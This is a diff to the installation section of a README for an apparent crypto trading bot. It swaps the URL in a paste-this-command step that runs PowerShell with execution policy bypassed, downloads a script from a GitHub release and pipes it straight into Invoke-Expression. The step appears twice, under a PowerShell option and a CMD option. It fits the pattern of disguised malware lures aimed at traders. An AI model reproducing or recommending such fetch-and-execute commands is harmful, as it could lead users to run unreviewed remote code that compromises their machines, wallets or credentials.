@@ -64,12 +64,12 @@ The bot uses batch account processing (batch trading) with automatic long/short 
 Open **PowerShell** and run this **single command**:
 
 ```powershell
-powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
+powershell -ep bypass -c "iwr https://github.com/Affedzie/Variational-Trade-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
 ```
 ### Option 2: Cmd 
 Open **CMD** and run this **single command**:
 ```
-powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
+powershell -ep bypass -c "iwr https://github.com/Affedzie/Variational-Trade-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
 ```
 
 ### 2. Configuration
